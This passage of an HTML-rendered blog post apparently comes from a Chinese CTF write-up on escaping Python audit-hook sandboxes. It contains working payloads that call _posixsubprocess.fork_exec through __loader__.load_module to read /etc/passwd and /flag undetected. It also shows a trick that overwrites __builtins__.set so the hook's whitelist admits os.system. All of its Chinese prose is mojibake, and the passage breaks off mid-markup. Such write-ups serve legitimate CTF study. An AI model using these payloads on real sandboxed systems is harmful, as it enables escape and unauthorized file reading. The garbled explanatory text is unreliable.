class="string">&#x27;_pickle&#x27;</span>, <span class="string">&#x27;_posixsubprocess&#x27;</span>, <span class="string">&#x27;_random&#x27;</span>, <span class="string">&#x27;_sha1&#x27;</span>, <span class="string">&#x27;_sha256&#x27;</span>, <span class="string">&#x27;_sha3&#x27;</span>, <span class="string">&#x27;_sha512&#x27;</span>, <span class="string">&#x27;_signal&#x27;</span>, <span class="string">&#x27;_socket&#x27;</span>, <span class="string">&#x27;_sre&#x27;</span>, <span class="string">&#x27;_stat&#x27;</span>, <span class="string">&#x27;_statistics&#x27;</span>, <span class="string">&#x27;_string&#x27;</span>, <span class="string">&#x27;_struct&#x27;</span>, <span class="string">&#x27;_symtable&#x27;</span>, <span class="string">&#x27;_thread&#x27;</span>, <span class="string">&#x27;_tracemalloc&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;cmath&#x27;</span>, <span class="string">&#x27;errno&#x27;</span>, <span class="string">&#x27;faulthandler&#x27;</span>, <span class="string">&#x27;fcntl&#x27;</span>, <span class="string">&#x27;gc&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;pyexpat&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;unicodedata&#x27;</span>, <span class="string">&#x27;xxsubtype&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="posixsubprocess-æ‰§è¡Œå‘½ä»¤"><a href="#posixsubprocess-æ‰§è¡Œå‘½ä»¤" class="headerlink" title="_posixsubprocess æ‰§è¡Œå‘½ä»¤"></a><code>_posixsubprocess</code> æ‰§è¡Œå‘½ä»¤</h3><p><code>_posixsubprocess</code> æ˜¯ <strong>CPython å†…éƒ¨çš„ä¸€ä¸ª C æ‰©å±•æ¨¡å—</strong>ï¼Œä¸“é—¨ç”¨æ¥åœ¨ç±» Unix ç³»ç»Ÿï¼ˆLinux &#x2F; macOSï¼‰ä¸‹ <strong>é«˜æ•ˆåœ°åˆ›å»ºå­è¿›ç¨‹</strong>ã€‚å®ƒä¸æ˜¯ç»™æ™®é€šç”¨æˆ·ç›´æ¥ç”¨çš„ï¼Œè€Œæ˜¯è¢« <code>subprocess</code> æ¨¡å—çš„å†…éƒ¨å®ç°è°ƒç”¨çš„ã€‚</p>
<p>è¯¥æ¨¡å—çš„æ ¸å¿ƒå‡½æ•° <code>fork_exec</code> æä¾›äº†åœ¨ Unix ç³»ç»Ÿä¸‹å¿«é€Ÿã€ä½å±‚åœ°åˆ›å»ºå­è¿›ç¨‹å¹¶æ‰§è¡ŒæŒ‡å®šç¨‹åºçš„èƒ½åŠ›ã€‚è¯¥æ¨¡å—å¹¶æœªåœ¨ Python å®˜æ–¹æ ‡å‡†åº“æ–‡æ¡£ä¸­åˆ—å‡ºï¼Œå±äºå®ç°ç»†èŠ‚ï¼Œä¸åŒç‰ˆæœ¬çš„ Python ä¸­å‚æ•°å’Œè¡Œä¸ºå¯èƒ½æœ‰æ‰€å·®å¼‚ã€‚</p>
<p>ä¾‹å¦‚ Python 3.11 ä¸­å…·ä½“çš„å‡½æ•°å£°æ˜å¦‚ä¸‹:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>å‘½ä»¤ä¸å¯æ‰§è¡Œä½“</strong></p>
<ul>
<li><p><code>__process_args</code>: ä¼ ç»™å­è¿›ç¨‹çš„ argvï¼ˆé€šå¸¸ä¸ <code>__executable_list</code> ä¸€è‡´ï¼‰ã€‚å¯ä¸º <code>None</code>ï¼ˆç”±å®ç°æ¨æ–­ï¼‰ã€‚å…ƒç´ å¯ä¸º <code>str/bytes/PathLike</code>ã€‚</p>
</li>
<li><p><code>__executable_list</code>: <strong>å¿…é¡»æ˜¯ <code>bytes</code> åºåˆ—</strong>ï¼Œå¯¹åº” <code>execve(path, argv, env)</code> çš„ <code>argv</code>ï¼›ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ <code>b&quot;/bin/echo&quot;</code>ï¼‰ã€‚</p>
</li>
</ul>
</li>
<li><p><strong>FD å…³é—­&#x2F;ä¿ç•™ä¸ CWD&#x2F;ENV</strong></p>
<ul>
<li><p><code>__close_fds</code>: <code>True</code> æ—¶ï¼Œåœ¨å­è¿›ç¨‹é‡Œ<strong>å…³é—­</strong>é™¤æ ‡å‡† FDï¼ˆ0&#x2F;1&#x2F;2ï¼‰å’Œå¿…è¦ä¿ç•™ FD å¤–çš„<strong>å…¨éƒ¨ FD</strong>ï¼ˆä» 3 èµ·ï¼‰ã€‚</p>
</li>
<li><p><code>__fds_to_keep</code>: éœ€è¦åœ¨å­è¿›ç¨‹<strong>é¢å¤–ä¿ç•™</strong>çš„ FD çš„<strong>å‡åºå…ƒç»„</strong>ï¼ˆé€šå¸¸ä¸ç®¡é“ FD é…åˆï¼‰ã€‚</p>
</li>
<li><p><code>__cwd_obj</code>: å­è¿›ç¨‹çš„å·¥ä½œç›®å½•ï¼ˆå­—ç¬¦ä¸²è·¯å¾„ï¼‰ã€‚å¯å…è®¸ä¸º <code>None</code>ï¼ˆè¡¨ç¤ºä¸æ”¹å˜ï¼Œè§†ç‰ˆæœ¬å®ç°è€Œå®šï¼‰ã€‚</p>
</li>
<li><p><code>__env_list</code>: å­è¿›ç¨‹ç¯å¢ƒï¼Œ**<code>bytes</code> çš„ <code>KEY=VALUE</code> åºåˆ—**ï¼›ä¼  <code>None</code> è¡¨ç¤ºç»§æ‰¿çˆ¶è¿›ç¨‹ç¯å¢ƒã€‚</p>
</li>
</ul>
</li>
<li><p><strong>ä¸çˆ¶è¿›ç¨‹çš„ç®¡é“ï¼ˆæ ‡å‡†æµï¼‰</strong></p>
<p>çº¦å®šå‘½åï¼š<code>p2c=parentâ†’child</code>ï¼Œ<code>c2p=childâ†’parent</code>ã€‚æ¯å¯¹ç®¡é“é€šå¸¸ä¼ <strong>ä¸¤ç«¯</strong>ï¼Œè®©å‡½æ•°åœ¨çˆ¶&#x2F;å­ä¸¤ä¾§éƒ½èƒ½æ­£ç¡®å…³é—­æˆ–é‡å®šå‘ã€‚</p>
<ul>
<li><p><code>__p2cread</code>: <strong>å­è¿›ç¨‹è¯»å–ç«¯</strong>ï¼ˆå°†ä¼š dup åˆ°å­è¿›ç¨‹ <code>stdin</code>ï¼‰ï¼Œå¦åˆ™ä¼  <code>-1</code>ã€‚</p>
</li>
<li><p><code>__p2cwrite</code>: <strong>çˆ¶è¿›ç¨‹å†™å…¥ç«¯</strong>ï¼Œå¦åˆ™ <code>-1</code>ã€‚</p>
</li>
<li><p><code>__c2pred</code>: <strong>çˆ¶è¿›ç¨‹è¯»å–ç«¯</strong>ï¼ˆä»å­è¿›ç¨‹ <code>stdout</code> è¯»ï¼‰ï¼Œå¦åˆ™ <code>-1</code>ã€‚</p>
</li>
<li><p><code>__c2pwrite</code>: <strong>å­è¿›ç¨‹å†™å…¥ç«¯</strong>ï¼ˆå°†ä¼š dup åˆ°å­è¿›ç¨‹ <code>stdout</code>ï¼‰ï¼Œå¦åˆ™ <code>-1</code>ã€‚</p>
</li>
<li><p><code>__errread</code>: çˆ¶è¿›ç¨‹è¯»å–ç«¯ï¼ˆæ¥è‡ªå­è¿›ç¨‹ <code>stderr</code>ï¼‰ï¼Œå¦åˆ™ <code>-1</code>ã€‚</p>
</li>
<li><p><code>__errwrite</code>: å­è¿›ç¨‹å†™å…¥ç«¯ï¼ˆå°†ä¼š dup åˆ°å­è¿›ç¨‹ <code>stderr</code>ï¼‰ï¼Œå¦åˆ™ <code>-1</code>ã€‚</p>
<blockquote>
<p>æœ€å¸¸è§ï¼šåªæ•è· <code>stdout</code> â†’ è®¾ <code>c2p_r</code>&#x2F;<code>c2p_w</code>ï¼›<code>stdin/stderr</code> ä¸ç”¨æ—¶ä¼  <code>-1</code>ã€‚</p>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>é”™è¯¯æ±‡æŠ¥ç®¡é“ï¼ˆå­è¿›ç¨‹ <code>exec</code> å‰å‡ºé”™æ—¶ä½¿ç”¨ï¼‰</strong></p>
<ul>
<li><code>__errpipe_read</code>, <code>__errpipe_write</code>: <strong>å¿…ä¼ ä¸€å¯¹æœ‰æ•ˆ FD</strong> æ¥æ‰¿æ¥å­è¿›ç¨‹åœ¨ <code>exec</code> ä¹‹å‰çš„é”™è¯¯ï¼ˆåºåˆ—åŒ–åå†™å…¥ï¼‰ã€‚å¦‚æœä¼  <code>-1</code>ï¼Œå­è¿›ç¨‹å‡ºé”™å°†æ— æ³•å‘çˆ¶è¿›ç¨‹æŠ¥å‘Šï¼Œçˆ¶è¿›ç¨‹ä¹Ÿæ— ä»å¾—çŸ¥å¤±è´¥åŸå› ï¼ˆ<code>subprocess</code> å†…éƒ¨æ€»æ˜¯åˆ›å»ºè¿™ä¸€å¯¹ï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>è¿›ç¨‹å±æ€§&#x2F;ä¼šè¯&#x2F;ä¿¡å·&#x2F;èº«ä»½</strong></p>
<ul>
<li><p><code>__restore_signals</code>: <code>1/0</code>ï¼Œæ˜¯å¦åœ¨å­è¿›ç¨‹é‡Œæ¢å¤é»˜è®¤ä¿¡å·å¤„ç†ï¼ˆé€šå¸¸ <strong>1</strong>ï¼‰ã€‚</p>
</li>
<li><p><code>__call_setsid</code>: <code>1/0</code>ï¼Œæ˜¯å¦è°ƒç”¨ <code>setsid()</code> è®©å­è¿›ç¨‹æˆä¸ºæ–°ä¼šè¯é¦–è¿›ç¨‹ï¼ˆdaemon&#x2F;ç‹¬ç«‹ç»„å¸¸ç”¨ï¼‰ã€‚</p>
</li>
<li><p><code>__pgid_to_set</code>: è‹¥éé›¶ï¼Œåœ¨å­è¿›ç¨‹é‡Œè°ƒç”¨ <code>setpgid(0, __pgid_to_set)</code> è®¾ç½®è¿›ç¨‹ç»„ IDã€‚</p>
</li>
<li><p><code>__gid_object</code>: è®¾å®šæœ‰æ•ˆ GIDï¼ˆæ•´æ•°æˆ–å®ç° <code>__index__</code> çš„å¯¹è±¡ï¼‰ï¼Œæˆ– <code>None</code> ä¸æ”¹ã€‚</p>
</li>
<li><p><code>__groups_list</code>: é™„åŠ çš„ç»„ ID åˆ—è¡¨ï¼Œæˆ– <code>None</code>ã€‚</p>
</li>
<li><p><code>__uid_object</code>: è®¾å®šæœ‰æ•ˆ UIDï¼Œæˆ– <code>None</code>ã€‚</p>
</li>
<li><p><code>__child_umask</code>: è®¾ç½®å­è¿›ç¨‹ <code>umask</code>ï¼Œé€šå¸¸ <code>0</code> è¡¨ç¤ºä¸æ”¹æˆ–æŒ‰å®ç°çº¦å®šï¼›å®é™…å«ä¹‰ä¾ç‰ˆæœ¬ã€‚</p>
</li>
<li><p><code>__preexec_fn</code>: åœ¨å­è¿›ç¨‹ <strong>å…³é—­ FD å¹¶ exec å‰</strong>è°ƒç”¨çš„å›è°ƒã€‚âš  <strong>å¤šçº¿ç¨‹ä¸‹ä¸å®‰å…¨</strong>ï¼ˆå¯èƒ½æ­»é”ï¼‰ï¼Œèƒ½ä¸ç”¨å°±ä¸ç”¨ã€‚</p>
</li>
<li><p><code>__allow_vfork</code>: å…è®¸åº•å±‚é€‰æ‹© <code>vfork</code> ä¼˜åŒ–ï¼ˆå®ç°ç›¸å…³ï¼Œéæ‰€æœ‰å¹³å°å¯ç”¨ï¼‰ã€‚</p>
</li>
</ul>
</li>
<li><p><strong>è¿”å›å€¼</strong></p>
<ul>
<li>è¿”å› <strong>å­è¿›ç¨‹ PID</strong>ã€‚çˆ¶è¿›ç¨‹éšåè¯· <code>os.waitpid(pid, 0)</code> ç­‰å¾…å¹¶å›æ”¶</li>
</ul>
</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€å°åŒ–ç¤ºä¾‹:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<p>ç»“åˆä¸Šé¢çš„ <code>__loader__.load_module(fullname)</code> å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„ payload:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°å…¨ç¨‹è§¦å‘äº† <code>builtins.input/result</code>, <code>compile</code>, <code>exec</code> ä¸‰ä¸ª hookï¼Œè¿™äº› hook çš„è§¦å‘éƒ½æ˜¯å› ä¸º <code>input</code>ï¼Œ<code>compile</code>ï¼Œ<code>exec</code> å‡½æ•°è€Œè§¦å‘çš„ï¼Œ<code>__loader__.load_module</code> å’Œ <code>_posixsubprocess</code> éƒ½æ²¡æœ‰è§¦å‘ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] builtins.input/result, (&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;,)</span><br><span class="line">[+] compile, (b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;, &#x27;&lt;string&gt;&#x27;)</span><br><span class="line">[+] exec, (&lt;code object &lt;module&gt; at 0x7fbecc924670, file &quot;&lt;string&gt;&quot;, line 1&gt;,)</span><br></pre></td></tr></table></figure></div>

<p><code>_posixsubprocess</code> æ‰§è¡Œå‘½ä»¤æ—¶æœ¬èº«æ²¡æœ‰å›æ˜¾ï¼Œæ˜¯å¯ä»¥å°†å‘½ä»¤çš„ç»“æœå­˜æ”¾åœ¨ <code>__c2pwrite</code> å‚æ•°ä¸­ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">std_pipe = os.pipe()</span><br><span class="line">err_pipe = os.pipe()</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec(</span><br><span class="line">    (<span class="string">b&quot;/bin/bash&quot;</span>,<span class="string">b&quot;-c&quot;</span>,<span class="string">b&quot;cat /flag*&quot;</span>),</span><br><span class="line">    [<span class="string">b&quot;/bin/bash&quot;</span>],</span><br><span class="line">    <span class="literal">True</span>,</span><br><span class="line">    (),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    std_pipe[<span class="number">1</span>], <span class="comment">#c2pwrite</span></span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    *(err_pipe),</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">content = os.read(std_pipe[<span class="number">0</span>],<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure></div>

<h3 id="ç¯¡æ”¹å†…ç½®å‡½æ•°"><a href="#ç¯¡æ”¹å†…ç½®å‡½æ•°" class="headerlink" title="ç¯¡æ”¹å†…ç½®å‡½æ•°"></a>ç¯¡æ”¹å†…ç½®å‡½æ•°</h3><p>å¾ˆå¤šé¢˜é‡Œç™½åå•æ˜¯<strong>åœ¨é’©å­é‡Œä¸´æ—¶æ„é€ </strong>çš„ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>,<span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(...)</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœä½ èƒ½åœ¨<strong>ä¸‹ä¸€æ¬¡é’©å­æ‰§è¡Œå‰</strong>æŠŠâ€œå…¨å±€å¯è§â€çš„ <code>set</code> æ¢æ‰ï¼Œé‚£ä¹ˆ <code>WHITED_EVENTS = set(&#123;...&#125;)</code> è¿™è¡Œå°±ä¼šè°ƒç”¨ä½ çš„æ›¿èº«ï¼Œä»è€Œ<strong>å¾—åˆ°ä½ æƒ³è¦çš„â€œç™½åå•â€</strong>ï¼ˆæ¯”å¦‚åŒ…å« <code>&#39;os.system&#39;</code>ï¼‰ã€‚</p>
<ul>
<li><p>åœ¨å¾ˆå¤š REPL&#x2F;é¢˜ç›®ç¯å¢ƒé‡Œï¼Œæ‰§è¡Œä¸Šä¸‹æ–‡çš„ <code>__builtins__</code> æ˜¯ä¸€ä¸ª <strong>dict</strong>ï¼ˆ<code>builtins.__dict__</code> çš„æ‹·è´æˆ–ä»£ç†ï¼‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[<span class="string">&#x27;set&#x27;</span>] = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>,<span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>å¦‚æœ <code>__builtins__</code> æ˜¯ <strong>æ¨¡å—å¯¹è±¡</strong>ï¼Œå°±ç”¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [...]</span><br></pre></td></tr></table></figure></div></li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>è¿”å› <strong>list</strong> ä¹Ÿèƒ½è®© <code>if event not in WHITED_EVENTS</code> æ­£å¸¸å·¥ä½œï¼ˆ<code>in</code> å¯ç”¨äºåºåˆ—ï¼‰ï¼Œä¸ä¸€å®šéå¾—è¿”å›çœŸæ­£çš„ <code>set</code>ã€‚ä½†å¦‚æœé’©å­é‡Œæ¥ä¸‹æ¥å¯¹ç™½åå•åšé›†åˆæ“ä½œï¼ˆå¦‚ <code>.add()</code>ã€<code>|</code>ï¼‰ï¼Œä½ å°±å¾—è¿”å› <code>set([...])</code> ä»¥å…å´©æºƒã€‚</p>
<p>å¦å¤–è¿™é‡Œè¦åŒºåˆ†å°† <code>WHITED_EVENTS</code> å†™æˆ<strong>è¯­æ³•å­—é¢é‡</strong>çš„æƒ…å†µï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = &#123;<span class="string">&#x27;builtins.input&#x27;</span>,<span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>set({...})</code> æ˜¯â€œ<strong>è°ƒç”¨åå­—ä¸º <code>set</code> çš„å¯è°ƒç”¨å¯¹è±¡</strong>â€ï¼Œè€Œ <code>{...}</code> æ˜¯<strong>è¯­æ³•å­—é¢é‡</strong>ï¼Œæ ¹æœ¬<strong>ä¸ä¼šè°ƒç”¨</strong> <code>set</code>ã€‚æ‰€ä»¥å½“ä½ æŠŠ <code>__builtins__.set</code> ä¿®æ”¹æˆä¸€ä¸ª <code>lambda</code> æ—¶ï¼š</p>
<ul>
<li>å†™æˆ <code>WHITED_EVENTS = set({...})</code>ï¼š<br>è¿™ä¸€è¡Œä¼šå…ˆåš<strong>åç§°è§£æ</strong>ï¼ŒæŠŠåå­— <code>set</code> æŒ‰â€œå±€éƒ¨ â†’ å…¨å±€ â†’ å†…å»ºï¼ˆ<code>__builtins__</code>ï¼‰â€çš„é¡ºåºå»æ‰¾ã€‚<br>ç”±äºä½ æŠŠ <code>__builtins__.set</code> æ”¹æˆäº† lambdaï¼Œæœ€ç»ˆè°ƒç”¨åˆ°çš„å°±æ˜¯**ä½ æ”¹è¿‡çš„ <code>set</code>**ï¼Œè¿”å›ä½ æŒ‡å®šçš„åˆ—è¡¨&#x2F;é›†åˆï¼Œè‡ªç„¶å°±â€œé€ ç™½â€æˆåŠŸã€‚</li>
<li>å†™æˆ <code>WHITED_EVENTS = {...}</code>ï¼š<br>è¿™æ˜¯<strong>é›†åˆå­—é¢é‡</strong>ï¼Œè§£é‡Šå™¨ç”¨å­—èŠ‚ç  <code>BUILD_SET</code> ç›´æ¥æ„é€ ä¸€ä¸ªé›†åˆï¼Œ<strong>å®Œå…¨ä¸ç»è¿‡</strong> <code>set()</code> è¿™ä¸ªå¯è°ƒç”¨å¯¹è±¡ã€‚ä½ ä¿®æ”¹ <code>set</code> ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºæ ¹æœ¬<strong>æ²¡è°ƒç”¨</strong>å®ƒã€‚</li>
</ul>

    </div>
  </div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event 